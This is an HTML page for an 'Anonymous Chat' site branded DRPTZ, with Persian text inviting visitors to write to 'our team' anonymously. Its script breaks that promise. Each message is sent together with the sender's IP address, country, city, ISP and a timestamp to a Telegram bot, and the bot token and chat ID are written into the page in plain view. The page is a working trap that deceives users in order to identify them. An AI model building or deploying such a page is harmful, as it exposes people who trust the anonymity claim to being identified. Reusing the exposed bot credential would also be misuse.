<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Anonymous Chat - DRPTZ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Orbitron', sans-serif;
      background-color: #0d0d0d;
      color: #00ffcc;
      overflow: hidden;
    }
    .header {
      text-align: center;
      margin-top: 20px;
    }
    .header h1 {
      font-size: 1.8rem;
      margin: 0;
    }
    .header p {
      font-size: 1rem;
      margin-top: 5px;
      color: #eee;
    }
    .drptz {
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 1.5rem;
      color: #00ff00;
      font-weight: bold;
      z-index: 2;
      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
    }
    .chat-box {
      position: absolute;
      top: 55%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 500px;
      background-color: rgba(0, 0, 0, 0.6);
      padding: 20px;
      border-radius: 10px;
      z-index: 2;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      margin-bottom: 10px;
      background-color: #222;
      color: #0f0;
    }
    button {
      padding: 10px;
      width: 100%;
      background-color: #0f0;
      border: none;
      color: #000;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    .footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      text-align: center;
      font-size: 0.9rem;
      color: #888;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
    }
  </style>
</head>
<body>
  <div id="particles-js"></div>

  <div class="header">
    <h1>چت با تیم ما</h1>
    <p>هرچی دلت می‌خواد به صورت ناشناس بنویس</p>
  </div>

  <div class="drptz">DRPTZ</div>

  <div class="chat-box">
    <input type="text" id="messageInput" placeholder="پیام خود را بنویسید...">
    <button onclick="sendMessage()">ارسال</button>
  </div>

  <div class="footer" id="userInfo">Loading user info...</div>

  <!-- Sound -->
  <audio id="sendSound" src="https://www.soundjay.com/buttons/sounds/button-09.mp3" preload="auto"></audio>

  <!-- Particles.js -->
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
  <script>
    particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json');
  </script>

  <!-- IP & Country Info -->
  <script>
    async function fetchIPInfo() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        document.getElementById("userInfo").innerText = 
          `IP: ${data.ip} | Country: ${data.country_name} | City: ${data.city} | ISP: ${data.org}`;
        return data;
      } catch (e) {
        return {};
      }
    }

    async function sendMessage() {
      const input = document.getElementById("messageInput");
      const msg = input.value.trim();
      if (!msg) return;

      const sound = document.getElementById("sendSound");
      sound.play();

      const data = await fetchIPInfo();

      const fullMessage = `New Anonymous Message:
-------------------------
Message: ${msg}
IP: ${data.ip}
Country: ${data.country_name}
City: ${data.city}
ISP: ${data.org}
Time: ${new Date().toLocaleString()}
-------------------------`;

      await fetch("https://api.telegram.org/bot8145145957:AAFi82VMdaF5ShzbVUhkDKsSryE_q2TCzmU/sendMessage", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: "6830023746",
          text: fullMessage
        })
      });

      input.value = "";
    }

    fetchIPInfo();
  </script>
</body>
</html>
